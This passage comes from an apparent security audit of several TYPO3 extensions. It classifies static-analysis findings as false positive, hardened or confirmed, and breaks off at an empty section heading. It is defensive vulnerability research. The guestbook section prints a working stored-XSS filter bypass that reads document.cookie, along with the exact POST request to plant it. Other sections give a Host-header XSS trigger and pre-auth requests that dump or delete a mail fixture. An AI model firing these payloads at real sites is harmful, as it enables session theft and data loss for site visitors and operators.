`$user = $GLOBALS['BE_USER']->user['uid']` (`:388`) — server-side session value, `intval`-cast anyway. The heavy `$_REQUEST` usage in `renderAJAX()` (`:180-217`) and `showConfig()` (`:395-427`) flows into the widget manager (`$this->mgm`, `tx_mydashboard_widgetmgm`) and `parse_str`, not into SQL in this file. **Verdict: FALSE POSITIVE.**

### 2. Unrestricted file upload — NOT PRESENT
There is no file-upload handling in this controller (no `$_FILES`, `move_uploaded_file`, `GeneralUtility::upload_*`). **Verdict: N/A.**

### 3. IDOR (record read/write by request uid) — FALSE POSITIVE
All user-state operations target the **acting BE user's own uid** only:
- `renderAJAX()` `:178-179`, `showDashboard()` `:228`, `renderContent()` `:308`, `showConfig()` `:388-397/:430` all load/save via `$GLOBALS['BE_USER']->user['uid']` (`loadUserConf($user)` / `safeUserConf($user)`).
- The "set as home" path (`:404-413`) reads and updates `be_users` **for the same own uid**; `startModule` is a fixed constant string, not request-derived.

No request parameter selects a different user's uid; widget keys/values (`$_REQUEST['key']`, `['value']`, `['data']`) only manipulate the current user's own dashboard configuration blob. **Verdict: FALSE POSITIVE.**

### Note (out of scope, BE-authenticated only)
`renderAJAX()`/`showDashboard()`/`showConfig()` build HTML by concatenating `$_REQUEST`-derived widget keys and `BE_USER` fields into markup (e.g. `:398`, `:249-254`), and there is no CSRF token on the AJAX `action` handlers (`:180-218`). These are backend-user-authenticated concerns (self-XSS / CSRF within an authenticated BE session), not the pre-auth frontend classes requested. Not classified as a pre-auth finding.

## Result table
| Issue | Verdict |
|---|---|
| Reachability | Backend module — **authenticated BE user required, NOT anonymous/pre-auth** |
| SQLi | FALSE POSITIVE (`intval` on own be_user uid) |
| Unrestricted upload | NOT PRESENT (no upload code) |
| IDOR by uid | FALSE POSITIVE (all ops bound to acting BE user's own uid) |

### pixelant_pxa-pm-importer

#### pixelant / pxa-pm-importer — ProgressBarController dynamic dispatch

**Verdict: FALSE POSITIVE for RCE (bounded method dispatch on a fixed class; backend-authenticated route)**

## Sink
`Classes/Controller/Ajax/ProgressBarController.php:42`
```php
$action = $request->getParsedBody()['action'] ?? 'getStatus';   // :40
return $this->{$action}($request);                              // :42
```
Dynamic method call `$this->$action(...)`. The **method name is fully request-controlled** (POST body `action`).

## Why not RCE
`$this` is a concrete `ProgressBarController` instance that `extends` nothing. The dispatch can only resolve to methods defined on that class: `importProgressDispatcher`, `getStatus`, `close`, `__construct` (plus PHP magic none of which exist here). There is no `new $cls`, no `call_user_func` to an attacker-named class, no way to reach an arbitrary function. The callable identity is bounded to this one fixed object's own methods, all of which take a single `$request` argument.

Worst realistic case: invoking `close` (deletes a progress row by `uid`) or re-invoking the dispatcher — an authorization/logic smell, not code execution. So it is **not** code injection in the RCE sense.

## Reachability / auth
Registered as a **backend** AJAX route:
`Configuration/Backend/AjaxRoutes.php`
```php
'pxapmimporter-progress-bar' => [
    'path' => '/pxapmimporter/progress-bar-status',
    'target' => ProgressBarController::class . '::importProgressDispatcher',
];
```
Backend AjaxRoutes are served under the TYPO3 backend entry point and require a valid **`be_user`** session (no `'access' => 'public'` flag is set). Not reachable by an anonymous FE visitor. Full route: `/typo3/ajax/pxapmimporter-progress-bar`.

## Version
pxa_pm_importer **2.0.1**, TYPO3 `9.5.0–9.5.99`, depends `pxa_product_manager 9.5.1–9.99.99`.

**Note:** authenticated-BE-user method-name injection over a 4-method class is low severity, but the pattern should still be replaced with an explicit whitelist/`switch`.

### ribase_sr-sendcard

#### Security Audit — ribase / sr_sendcard (Send-A-Card)

- **File:** `Classes/Controller/SendcardPluginController.php`, `Classes/Mail/MailCard.php`
- **Version:** 4.0.1 — `ext_emconf.php` constraint `typo3 => 6.2.0-7.6.99`
- **Type / reachability:** Frontend plugin (`extends AbstractPlugin`), anonymous. No login gate. A logged-in FE user only pre-fills `from_name`/`from_email` (lines 389-396); anonymous senders can drive every `cmd` (``, `prompt`, `preview`, `send`, `view`, `print`). Optional `sr_freecap` CAPTCHA only gates `cmd=send` when `useCAPTCHA` is set.

## Summary verdict: no confirmed vulnerability. All candidate issues are hardened.

The plugin applies a **global input sanitizer** at the top of `main()` before any use:

```php
// lines 118-127
$cardData = GeneralUtility::_GP($this->prefixId);
if (is_array($cardData)) {
    foreach ($cardData as $name => $value) {
        $cardData[$name] = htmlspecialchars(strip_tags($value), ENT_COMPAT, 'UTF-8', false);
    }
    if (is_array(parse_url($cardData['card_image_path']))) {
        $cardData['card_image_path'] = '';   // effectively always cleared (parse_url almost always returns an array)
    }
}
```

### 1. SQL injection — FALSE POSITIVE (hardened)
Every request-derived value reaching SQL is parameter-quoted or integer-cast:

- `SendcardPluginController.php:264` `exec_SELECTquery(..., 'pid = ' . intval($cardSeriesUid[...]) ...)` — `intval`. Safe.
- `SendcardPluginController.php:670` `exec_INSERTquery($this->tbl_name, $cardData)` — array form; TYPO3_DB auto-quotes all values, and `$cardData` is first whitelisted to `$tableColumnsArr` (lines 661-668). Safe.
- `getCard()` `SendcardPluginController.php:984` `'id=' . $GLOBALS['TYPO3_DB']->fullQuoteStr($id, ...)` where `$id = $cardData['cardid']` (attacker-controlled) — `fullQuoteStr`. Safe.
- `notifySender()` `:1047` `'uid=' . fullQuoteStr($row['uid'], ...)`. Safe.
- `cleanupOldCards()` `:864` uses `mktime()` of `conf[...]` (admin TS), no request input. Safe.

No `sql_query`/raw concatenation of request data anywhere. **Verdict: FALSE POSITIVE.**

### 2. Mail-header injection — FALSE POSITIVE (hardened)
`cmd=send` (line 627) can be reached directly without going through `preview` validation, but the mail is built in `MailCard::sendEmail()` via `TYPO3\CMS\Core\Mail\MailMessage` (Swift Mailer):

- `MailCard.php:132` `$mail->setTo(array($emailData['to_email'] => $emailData['to_name']))`
- `:119` `$mail->setSubject($subject)` — subject is derived from the **template** first line (`:110-118`), not from user input.
- `:126-129` `From`/`Sender`/`Return-Path`/`Reply-To` are all `conf['siteEmail']`/`conf['siteName']` (admin), never user input.

Recipient name/address pass through Swift's header encoder, which encodes/rejects CR/LF — header injection is not possible. Additionally the values were already `strip_tags`+`htmlspecialchars`-mangled at input. **Verdict: FALSE POSITIVE.**

### 3. Open redirect — FALSE POSITIVE
No `Location:` / `header()` redirect is emitted from user input. `link_pid`, `to_email`, etc. are fed to `cObj->getTypoLink_URL()` (page-id typolink builder, `get_url()` line 1314) and rendered into template markers, not used as a redirect target.

### 4. SSRF — FALSE POSITIVE (hardened)
- `card_image_path` is force-cleared at `:124-126` (the `parse_url()` guard is effectively always true), so the attacker cannot point image handling at an arbitrary path/URL; `tempPath` falls back to `conf['dir']`.
- `MailCard::embedMedia()` (`:152-179`) does `Swift_Image::fromPath($src)` for `<img src>` in the **HTML mail template**, but the only user text placed into that HTML (`card_message`, `card_title`, `card_signature`) is `htmlspecialchars`-encoded at input, so an attacker cannot inject a real `<img src="http://internal/...">` tag. Requires `enableHTMLMail` and is still not attacker-injectable. **Verdict: FALSE POSITIVE.**

## Result table
| Issue | Verdict |
|---|---|
| SQLi | FALSE POSITIVE (intval / fullQuoteStr / whitelisted array insert) |
| Mail-header injection | FALSE POSITIVE (Swift Mailer header encoding; subject/from not user-controlled) |
| Open redirect | FALSE POSITIVE (no user-controlled Location) |
| SSRF | FALSE POSITIVE (card_image_path cleared; mail HTML is htmlspecialchars-encoded) |

### simonschaufi_ve_guestbook

#### Security Audit — `simonschaufi/ve_guestbook` (Modern Guestbook)

- **File audited:** `pi1/class.tx_veguestbook_pi1.php`
- **Version:** 3.3.0 (`state = stable`) — `ext_emconf.php:20`
- **TYPO3 compat:** `7.6.0 - 7.9.99` — `ext_emconf.php:27`
- **Reachability:** Anonymous frontend plugin (`AbstractPlugin`). Two modes selected by FlexForm `what_to_display`: `LIST`/`TEASER` (renders stored entries) and `FORM` (anonymous submit). Any visitor on the hosting page can both submit and read entries. `FORM` mode is a `USER_INT` object with `pi_checkCHash = false` (`:160-161`).

---

## Issue 1 — Stored XSS via submitted entry fields → **CONFIRMED pre-auth stored XSS** (default config)

### Tainted chain (store → persist → render)

**Store** (`displayForm`, `:686-748`):
- `:686` `$this->postVars = GeneralUtility::_GP('tx_veguestbook_pi1')` — raw request input (GET/POST).
- `:690` each value passed through `$this->localContentObject->removeBadHTML($value)`.
- `:732-738` for `db_fields = ['firstname','surname','email','homepage','place','entry','entrycomment']`, optional `strip_tags($v, $this->config['allowedTags'])` **only if** `allowedTags` TS is set (default `false`, `:222-226`), then `removeBadHTML($v)` again.
- `:748` `exec_INSERTquery($this->strEntryTable, $saveData)` — INSERT is DBAL-quoted (no SQLi here), so the payload is persisted **as-is** into `tx_veguestbook_entries`.

**Render** (`getItemMarkerArray`, `:516-582`, via `displayList` → `getListContent` → `substituteMarkerArrayCached`):
- `:521` `###GUESTBOOK_FIRSTNAME###` = `cutDown($row['firstname'])` — truncation only, **no `htmlspecialchars`**.
- `:522` `###GUESTBOOK_SURNAME###` = `cutDown($row['surname'])` — **no escaping**.
- `:526` `###GUESTBOOK_PLACE###` = `cutDown($row['place'])` — **no escaping**.
- `:568` `###GUESTBOOK_ENTRY###` = `nl2br($row['entry'])` — **no escaping**.
- `:572` `###GUESTBOOK_ENTRYCOMMENT###` = `substituteEmoticons(nl2br($row['entrycomment']))` — **no escaping**.
- `:538` `###GUESTBOOK_EMAIL###` = `trim($row['email'])` — **no escaping** (only the `_URL` variant at `:533` is `htmlspecialchars`'d; the plain email marker is not).

**Sink:** `substituteMarkerArrayCached` (`:502`, `:364`) performs raw string substitution — no Fluid, no escaping. Markers land in HTML body context in `Resources/Private/Templates/template.html` (e.g. `:17` `<h2>###GUESTBOOK_FIRSTNAME### ###GUESTBOOK_SURNAME###...`, `:29` `<p>###GUESTBOOK_ENTRY###</p>`). **Output is HTML.**

### Why the only mitigation (`removeBadHTML`) is ineffective
`ContentObjectRenderer::removeBadHTML()` is a TYPO3 **blocklist cleanup**, explicitly not an XSS-safe sanitizer. It regex-strips `<script>/<iframe>/<object>/<style>/...` tags and tags containing an `on…=` event handler (`/<[^>]*[^a-z]on[a-z]*\s*=[^>]*(>|$)/`). It does **not** HTML-encode `<`/`>`/`"`, and is trivially bypassed. Canonical no-interaction bypass — insert a `>` inside an earlier attribute so the event-handler regex's `[^>]*` terminates before reaching `on…=`:

```
<img src="x" alt=">" onerror=alert(document.cookie)>
```

`removeBadHTML` fails to match/strip this, the browser fires `onerror`. `javascript:` URIs (e.g. in an `<a>`) are also untouched.

### Exact trigger
1. Visit the page hosting the plugin in `FORM` mode. POST the guestbook form:
   ```
   POST /index.php?id=<formPageId> HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   id=<formPageId>&tx_veguestbook_pi1[submitted]=1&tx_veguestbook_pi1[firstname]=<img src="x" alt=">" onerror=alert(document.cookie)>&tx_veguestbook_pi1[surname]=x&tx_veguestbook_pi1[entry]=hi
   ```
   (URL-encode the payload value.)
2. Any visitor loading the `LIST`/`TEASER` page executes the script. Persistent, affects every viewer including logged-in backend users who preview the page.

### Gating (severity modifiers — all optional, default OFF)
- **CAPTCHA** (`sr_freecap` / `captcha`): only active if configured via FlexForm `captcha` (`:186`, `:824-833`), and only for non-logged-in submitters. A CAPTCHA blocks automated spam but **does not prevent** a human attacker from planting one persistent payload — it does not downgrade the stored-XSS.
- **`manual_backend_release`** (FlexForm `s_form`, `:247`): if `== 1`, new entries get `hidden = 1` (`:726-728`) and are not displayed until a backend editor approves. **If enabled, this is an approval-before-display gate that downgrades the finding to "gated / requires moderator to approve the malicious entry."** Default is off → immediate display.

**Verdict: CONFIRMED pre-auth stored XSS** in default configuration. Downgraded to *gated* only when `manual_backend_release = 1`.

---

## Issue 2 — Raw SQL in `displayList` (ORDER BY / WHERE / LIMIT) → **FALSE POSITIVE (no request input reaches SQL)**

`displayList` builds two `exec_SELECTquery` calls with concatenated SQL (`:285`, `:351`):

```php
$temp_where = 'pid IN (' . $this->config['pid_list'] . ')' . $language_filter . $this->cObj->enableFields(...);   // :284,:349
$orderBy = $this->config['sortingField'] . ' ' . $this->config['sortingDirection'];                                // :340
$res = ...->exec_SELECTquery('*', $this->strEntryTable, $temp_where, '', $orderBy, $limit_start.','.$this->config['limit']); // :351
```

None of the concatenated parts derive from anonymous request input:
- **`pid_list`** (`:167,:172`) — from FlexForm `pages` / `recursive`, passed through `GeneralUtility::intExplode` → integers. Admin/editor-controlled, not request.
- **`language_filter`** (`:281`) — `sys_language_uid` from `frontendController->config['config']` (TypoScript), not request.
- **ORDER BY `sortingField` / `sortingDirection`** (`:260-264`, `:340`) — from FlexForm `listOrderBy` / `ascDesc` (or TS fallback). This is the classic unquotable ORDER BY sink, **but the value is set by the backend editor in the plugin FlexForm, not by the anonymous visitor.** Not attacker-controllable.
- **LIMIT** (`:343-351`) — `$limit_start = $this->piVars['pointer'] * $this->config['limit']`. `piVars['pointer']` is request input, but the arithmetic multiplication coerces it to a number in PHP, so no string reaches the SQL; `limit` is FlexForm/TS. Not injectable.

**Verdict: FALSE POSITIVE.** The raw ORDER BY is FlexForm-driven (privileged config), and the pointer is numerically coerced. No anonymous request value reaches the SQL string.

---

## Summary

| Issue | Verdict |
|---|---|
| Stored XSS (firstname/surname/place/entry/entrycomment/email) | **CONFIRMED pre-auth stored XSS** (default); *gated* if `manual_backend_release=1` |
| Raw SQL in `displayList` (ORDER BY / WHERE / LIMIT) | **FALSE POSITIVE** — all SQL-concatenated values are FlexForm/TS-derived or numerically coerced |
| SQLi on INSERT (submit path) | Not vulnerable — `exec_INSERTquery` is DBAL-quoted |

### site_site-core

#### B — site/site-core — AjaxMiddleware

**Verdict: FALSE POSITIVE** (instantiated class is a whitelisted config value, not request-controlled)

## Sink
`Classes/Http/Middleware/AjaxMiddleware.php:79` — `$classInstance = GeneralUtility::makeInstance($thisAjaxCfg['target'], ...)`
(the CodeQL "code injection" sink; line 84 `$classInstance->{$method}(...)` is the method call.)

## Analysis — class identity is NOT attacker-controlled
Request input only *selects* which registered config entry is used; it never supplies the class name:

- `AjaxMiddleware.php:49` `$queryParams = $request->getQueryParams()`
- `AjaxMiddleware.php:54` `$ajaxId = $queryParams['vendor'].'/'.$queryParams['ajax']`
- `AjaxMiddleware.php:60` `$ajaxConfigIdentifiers = ...AjaxService::findAll()` → returns `$GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['site_core']['AJAX']`, populated only by server-side `AjaxService::register()` calls (`Classes/Service/AjaxService.php:24`).
- The `vendor`/`ajax` params match against config **keys**; the resulting `$thisAjaxCfg['target']` is the developer-registered class-name **value**. An attacker can pick among registered targets but cannot inject a new class string.

Therefore the `makeInstance()` target at line 79 is confined to the whitelist of registered AJAX handlers → not code injection.

## Secondary (lower severity, bounded) — dynamic method at line 84
`$method` can become request-controlled in the wildcard branch:
- `AjaxMiddleware.php:69` `$method = explode('-', $queryParams['ajax'])[1]` (only when a config key `vendor/Name-*` matches), with **no `method_exists()` guard**.
This allows calling an arbitrary *method name* on an already-whitelisted handler instance. It is method-injection on a fixed class, not arbitrary-code execution, and requires a matching wildcard AJAX config to be registered. Worth hardening (add a `method_exists`/allow-list) but not the reported code-injection RCE.

## Reachability
Frontend middleware `site-core/ajax` (`Configuration/RequestMiddlewares.php`), ordered `after typo3/cms-frontend/authentication` — runs for every request, no login required (pre-auth). Activation: request URI starts with `/ajax` (`AjaxMiddleware.php:41`). Also requires at least one registered AJAX config, else `findAll()`/`$ajaxConfigs[$ajaxId]` dereferences an unset global. Class is `@deprecated`.

## Trigger (selects a config, does not inject a class)
```
GET /ajax/?vendor=<RegisteredVendor>&ajax=<RegisteredName>-<method>
```

## Version
`ext_emconf.php` not present at expected path (empty read); package is `site/site-core`, class annotated `@deprecated in v3, will be removed in v4`.

### skynettechnologies_typo3-allinoneaccessibility

#### C — skynettechnologies/typo3-allinoneaccessibility — AwesomeMiddleware

**Verdict: FALSE POSITIVE** (SSRF target URL is a hardcoded constant; attacker input only reaches the POST body of that fixed request)

## Sink
`Classes/Middleware/AwesomeMiddleware.php:33` — `curl_setopt($ch, CURLOPT_POSTFIELDS, $postData)` (flagged SSRF; actual network call is `curl_exec` line 35 on the handle created line 30).

## Analysis
The fetched URL host/scheme is fixed and not attacker-influenced:

- `AwesomeMiddleware.php:27` `$apiUrl = "https://ada.skynettechnologies.us/api/widget-settings";` — **hardcoded**.
- `AwesomeMiddleware.php:30` `$ch = curl_init($apiUrl);` — request target is the constant above; no request value flows into the URL.
- Attacker-controlled data: `AwesomeMiddleware.php:23` `$domain = $_SERVER['HTTP_HOST'] ?? '';` → `AwesomeMiddleware.php:28` `$postData = ['website_url' => $domain]`. The Host header lands only in the **POST body** (`website_url` field) sent to the fixed API. It cannot redirect, change host/scheme, or introduce `file://`/internal targets.
- `$domain_base64` (line 25) is computed but unused. `CURLOPT_FOLLOWLOCATION` is set, but redirects are followed from the trusted fixed API host, not from an attacker URL.

No request-controlled fetch URL → not SSRF.

## Related note (not the reported finding)
The fixed-API JSON response is echoed unescaped into an inline `<script>` (`console.log('ADA Full API Response:', <json_encode>...)`) injected before `</body>`. The widget `$color/$position/$licensekey/$icon_*` variables are undefined here and fall back to constants (never request-sourced in this file), so there is no request-to-HTML reflected XSS via those. The Host header is reflected only through the remote API round-trip, gated by TYPO3's `trustedHostsPattern`. Not an SSRF and not a clean XSS chain.

## Reachability
Frontend middleware `Allinoneaccessibility-frontend` (`Configuration/RequestMiddlewares.php`), `after typo3/cms-frontend/prepare-tsfe-rendering` — runs pre-auth on frontend rendering. Reachable, but the sink is non-exploitable as SSRF.

## Version
`ext_emconf.php`: version `14.0.1`, state `stable`, `typo3` constraint `14.0.0-14.9.99`.

### smichaelsen_social-grabber

#### Security Audit — `social_grabber` (Sebastian Michaelsen "Social Grabber")

- **Version:** 2.4.0 (`ext_emconf.php`)
- **TYPO3 compat:** 7.6.2 – 8.7.99 (long EOL)
- **Base dir:** `/home/user/sources/code/typo3-extensions/smichaelsen_social-grabber/`

## Pre-auth entry points

| Entry | Wiring | Auth level |
|-------|--------|------------|
| `Eid\InstagramOAuth::processRequest` | `ext_localconf.php` → `eID_include['tx_socialgrabber_instagramoauth']` | Anonymous request, but **token-gated** (see Issue 1) |
| `DataProcessing\FeedDataProcessor` | TypoScript `dataProcessing` on the FE plugin | Runs during public FE render, but fed by **editor FlexForm/DB config**, not request params |

No PSR-15 middleware. Command controllers (`GrabberCommandController`, `UpdatePostsCommandController`) are CLI-only. `PostRepository` is Extbase (parameterized) and only used from CLI/plugin.

---

## Issue 1 — eID `InstagramOAuth` (OAuth token set) → **HARDENED (token-gated), no SQL/XSS sink**

- **Flow:** `processRequest` reads `requestToken` (`InstagramOAuth.php:17`) and rejects unless it strictly equals `getRequestToken()` = `hash('sha256', $beUser->user['uid'] . $GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey'])` (`:19`, `:51`).
- **No SQLi:** the handler touches no database — it exchanges `code` (`:29`) at the Instagram API and stores the returned access token in `sys_registry` via `AccessTokenService::setAccessToken` (TYPO3 `Registry`, parameterized).
- **No XSS:** the only response bodies are the static strings `"invalid request token"` and `"Authentication successful. You may close this window."`. The attacker-supplied `code` is sent server-to-server, never reflected.
- **Token strength:** `!==` strict compare against a 64-hex SHA-256 that mixes the site `encryptionKey` (secret). Absent the key an attacker cannot forge it; empty/absent `requestToken` → `null !== <hash>` → rejected. Empty `encryptionKey` throws → rejected.
- Minor correctness bug (not security): `$response->withStatus(401)` return value is discarded (PSR-7 immutability), so the rejection path still emits HTTP 200 with the "invalid" body — but it returns before the token-setting sink, so there is no security impact.

**Verdict:** No SQLi/XSS/IDOR in scope. Even the sink (poisoning the stored Instagram token) requires the secret-key-derived token.

## Issue 2 — Raw SQL in `FeedDataProcessor::loadPosts` → **FALSE POSITIVE (not request-derived)**

- **Sink:** `exec_SELECTgetRows` / `exec_SELECTquery` with `sprintf(... IN (%s) ..., implode(',', $channelIds))` and a `grabber_class` value concatenated into `getFilterTopicsWhereStatement` (`FeedDataProcessor.php` `loadPosts`/`getFilterTopicsWhereStatement`).
- **Taint source:** all inputs come from `$processedData['data']['pi_flexform']` (the content element's FlexForm — editor/backend-configured), read via `getFlexFormValue`. `channelList` is additionally normalized with `GeneralUtility::intExplode()`; `grabber_class` is read from the `tx_socialgrabber_channel` DB row (backend-managed). None derive from `_GP`/`getQueryParams`/`getParsedBody`.

**Verdict:** Raw string-built SQL, but no anonymous-request-controlled value reaches it. Not a pre-auth SQLi. (Still recommend `QueryBuilder` parameterization as defense-in-depth, since a backend editor with plugin-config rights controls `channel`/`filter_topics`.)

---

## Summary

| Issue | Verdict |
|-------|---------|
| eID `InstagramOAuth` (SQLi/XSS/token-set) | HARDENED — SHA-256 token bound to `encryptionKey`; no DB/HTML sink |
| Raw SQL in `FeedDataProcessor` | FALSE POSITIVE — editor FlexForm/DB config, not request input; `channelIds` int-normalized |

**No confirmed pre-auth vulnerability.** The single anonymous entry point is token-gated and has no injection sink.

### sourcebroker_restrictfe

#### D — sourcebroker/restrictfe — RequestCheck middleware

**Verdict: NEEDS-CONFIG** (reflected XSS into the text/html 403 page via the Host header, gated by TYPO3 `trustedHostsPattern`; no direct query/body reflection)

## Sink
`Classes/Middleware/RequestCheck.php:83` — `echo $outputContent;` (Content-Type `text/html`, header set line 75).

## Analysis
The only value reflected into the echoed HTML is host-derived, not a raw query/body parameter:

- `RequestCheck.php:57` `$beLoginLink = GeneralUtility::getIndpEnv('TYPO3_SITE_URL') . 'typo3/';`
- `RequestCheck.php:58` `$templateContent = file_get_contents($templatePath)` (template path from config).
- `RequestCheck.php:62` `$outputContent = str_replace('{beLoginLink}', $beLoginLink, $templateContent);` — **no `htmlspecialchars`**.
- `RequestCheck.php:75` `header('Content-Type: text/html; charset=utf-8')` then `RequestCheck.php:83` `echo $outputContent;` — confirmed HTML response (403), not JSON/redirect.

`getIndpEnv('TYPO3_SITE_URL')` is built from the request Host header (`HTTP_HOST`). A Host value such as `evil"><script>alert(document.domain)</script>` is placed unescaped into the 403 body wherever the template contains `{beLoginLink}` → reflected XSS.

**Gate:** TYPO3 validates the Host header against `$GLOBALS['TYPO3_CONF_VARS']['SYS']['trustedHostsPattern']` before `getIndpEnv` returns it. Modern TYPO3 defaults reject a spoofed/HTML-bearing Host, which neutralizes this. Exploitable only when an operator has set a permissive pattern (`.*`) — a known but non-default misconfiguration. The template must also contain the `{beLoginLink}` placeholder (the shipped default template does). Hence NEEDS-CONFIG rather than CONFIRMED.

Note: the full request URL (incl. query string) is written to the `tx_restrictfe_redirect` cookie (line 66) but is **not** echoed into HTML, so query-string XSS does not apply here.

## Reachability
Frontend middleware `sourcebroker/restrictfe/request-check` (`Configuration/RequestMiddlewares.php`), `before typo3/cms-frontend/timetracker` — runs early, **pre-auth**. Its purpose is to block the frontend for unauthenticated visitors and serve this 403 page, so the blocked/echo state is the default active state for any anonymous request when the extension protects the instance. The XSS-relevant reflection therefore fires for unauthenticated attackers.

## Trigger (requires permissive `trustedHostsPattern`)
```
GET / HTTP/1.1
Host: x"><script>alert(document.domain)</script>
```
(sent to an instance protected by restrictfe with `[SYS][trustedHostsPattern]='.*'`)

## Version
`ext_emconf.php`: version `12.0.1`, state `stable`, `typo3` constraint `11.5.0-13.4.999`.

### stmllr_typo3-zahnstocher

#### A — stmllr/typo3-zahnstocher — eID Dispatcher

**Verdict: FALSE POSITIVE** (bounded dispatcher, not arbitrary code injection / RCE)

## Sink
`Classes/eID/Dispatcher.php:61` — `$controller->$action();`

## Analysis
Both the class and method names come from request input, so CodeQL flags a "code injection". But the reachable callable set is tightly bounded and cannot escape the extension's own namespace:

- `Classes/eID/Dispatcher.php:51` `$controllerName = GeneralUtility::_GP('controller')`
- `Classes/eID/Dispatcher.php:52` `$actionName = GeneralUtility::_GP('action')`
- `Classes/eID/Dispatcher.php:53` both validated by `isParameterValid()` → `preg_match('/^[a-zA-Z]+$/')` — **letters only**, no backslash / dot / digit, so no namespace traversal.
- `Classes/eID/Dispatcher.php:83` (`getControllerInstance`) hardcodes the prefix `Stmllr\Zahnstocher\Controller\` and gates on `class_exists()`. Only classes actually shipped in that namespace can be instantiated.
- `Classes/eID/Dispatcher.php:59-60` action = `$actionName.'Action'` gated by `method_exists()`.

Only one controller exists: `Classes/Controller/MailboxController.php`, exposing `showAction()` (dumps the mbox fixture file) and `flushAction()` (deletes it). Both take **no request-derived arguments**. The attacker cannot supply an arbitrary class, an arbitrary callable, or any argument data — only choose between two benign test-helper actions on one fixed class. This is a whitelisted controller/action dispatcher, not code injection.

## Reachability
Pre-auth. Registered as eID: `ext_localconf.php` → `$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['tx_typo3_zahnstocher']`. Reachable unauthenticated.

## Non-RCE note (out of scope for this finding)
`flushAction` will unlink/blank the mailbox fixture file pre-auth, and `showAction` discloses captured mail — a minor pre-auth info-disclosure / data-loss issue in a dev/test extension, but **not** the reported code-injection class. No path to arbitrary code execution.

## Trigger (illustrative, non-RCE)
```
GET /index.php?eID=tx_typo3_zahnstocher&controller=MailboxController&action=show
GET /index.php?eID=tx_typo3_zahnstocher&controller=MailboxController&action=flush
```

## Version
`ext_emconf.php`: version empty (dev), state `beta`, `typo3` constraint `6.2.0-7.6.99` (legacy; not installable on supported TYPO3).

### subugoe_bib

#### Security Audit — `subugoe/bib` (Bib — bibliography manager)

- **File audited:** `pi1/class.tx_bib_pi1.php` (3532 lines) + SQL-bearing helpers it delegates to (`Classes/Utility/ReferenceReader.php`, `Classes/Utility/DbUtility.php`).
- **Version:** 1.6.1 (`state = beta`) — `ext_emconf.php:7`
- **TYPO3 compat:** `6.2.0 - 7.99.99`, PHP `5.5.0 - 7.0.99` — `ext_emconf.php`
- **Note:** This file is **byte-identical** to `ipf_bib/pi1/class.tx_bib_pi1.php` (`diff` = identical). Same findings apply to both forks.
- **Reachability:** Anonymous frontend list/search plugin. Search form (`piVars['search']['all']`, `['ref_ids']`, `['all_rule']`), pagination (`piVars['page']`), single view (`piVars['show_uid']`) are all reachable by any visitor. Editor/import/delete actions are gated behind `edit_mode` (`:195`), which requires a valid BE user or a whitelisted FE user **and** `editor.enabled`.

---

## Issue 1 — Only raw SQL in pi1 (`checkFEauthorRestriction`) → **FALSE POSITIVE (gated + not request-tainted)**

The single raw SQL statement in the audited pi1 file (`:3087-3091`):

```php
$res = $this->getDatabaseConnection()->exec_SELECTquery(
    'fe_user_id',
    'tx_bib_domain_model_author as a, tx_bib_domain_model_authorships as m',
    'a.uid = m.author_id AND m.pub_id = ' . $publicationId
);
```

`$publicationId` is **not** request input: the only caller passes `$pub['uid']` (`:2353`), i.e. the integer `uid` of a publication row already fetched from the DB during list rendering. Additionally the whole block is doubly gated:
- Reached only when `$editMode` is true (`:2352`), and `edit_mode` requires an authenticated BE user or whitelisted FE user (`:190-195`) — **not pre-auth**.
- The query itself only runs when `conf['FE_edit_own_records'] != 0` (TS, `:3084`).

**Verdict: FALSE POSITIVE.** Not pre-auth reachable and the interpolated value is a DB-sourced integer, not attacker input.

---

## Issue 2 — Anonymous search terms → SQL (`piVars['search']['all']`, `ref_ids`) → **hardened**

Search input flows: `piVars['search']['all']` / `['ref_ids']` (`pi1:1209-1233`, `initializeSelectionFilter`) → `extConf['filters']` → `ReferenceReader` WHERE builder → `exec_SELECTquery`.

Mitigations confirmed:
- **`ref_ids`** (`pi1:1210-1211`): `GeneralUtility::intExplode(',', $ids)` → integer array. Safe.
- **General search words** (`pi1:1220-1221`): `trimExplode` keeps them as raw strings, but every word hits SQL only through `fullQuoteStr`:
  - `ReferenceReader.php:1140` `$word = $this->db->fullQuoteStr($word, ...)` then `... LIKE $word` (getFilterSearchFieldsClause).
  - Author search `:529`, citeid `:665`/`:1021`, tag/keyword/author words `:1220` — all `fullQuoteStr`'d.
- **Numeric filters** (years, uid, states, rule, types): `intval` / `implode_intval` (`pi1:945-1039`, `DbUtility.php:118,174,188`).
- **`show_uid` single view** (`pi1:1379-1381`): `intval`. **`piVars['page']`** (`pi1:1481`): `Utility::crop_to_range(..., 0, max)` — numerically clamped before reaching the LIMIT clause.

**Verdict: hardened.** All request-derived values reaching SQL are either integer-cast or `fullQuoteStr`-escaped.

---

## Issue 3 — ORDER BY built by raw concatenation → **FALSE POSITIVE (FlexForm-driven, not request)**

`ReferenceReader.php:1368-1370` concatenates sort field + direction directly into `ORDER BY` (identifiers can't be `fullQuoteStr`'d — the classic unquotable sink):

```php
$orderClause[] = $filter['sorting'][$i]['field'] . ' ' . $filter['sorting'][$i]['dir'];
```

But `filters['sort']['sorting']` is populated (`pi1:1500-1563`, `initializeSortingFilter`) **only** from:
- `extConf['sorting']` = `pi_getFFvalue(..., 'sorting', ...)` — plugin **FlexForm** (`pi1:346`), table-prefixed (`getReferenceTable().'.'.$sortField`), or
- hard-coded field lists (`:1533-1563`), or
- `date_sorting` FlexForm/TS (`:345,:400`).

No `piVars`/`_GP` value reaches the sort field or direction. The sort configuration is set by the backend editor, not the anonymous visitor.

**Verdict: FALSE POSITIVE.** ORDER BY is privileged FlexForm/TS config, not attacker-controllable.

---

## Issue 4 — Stored/reflected XSS
The bib plugin renders publication data (editor-curated bibliography records) via marker substitution, not anonymous-submitted content. There is no anonymous write path to displayed data (create/edit is behind `edit_mode`, `:195`). No pre-auth stored-XSS surface comparable to a guestbook. Not a pre-auth finding.

---

## Summary

| Issue | Verdict |
|---|---|
| Raw SQL `checkFEauthorRestriction` (`:3087`) | **FALSE POSITIVE** — behind `edit_mode` auth; `$publicationId` is a DB-sourced int |
| Anonymous search terms → SQL | **hardened** — `intExplode` / `fullQuoteStr` throughout |
| ORDER BY concatenation | **FALSE POSITIVE** — FlexForm/TS-driven, no request input |
| Pre-auth stored XSS | Not present — no anonymous write path to rendered data |

### ubl_supportchat

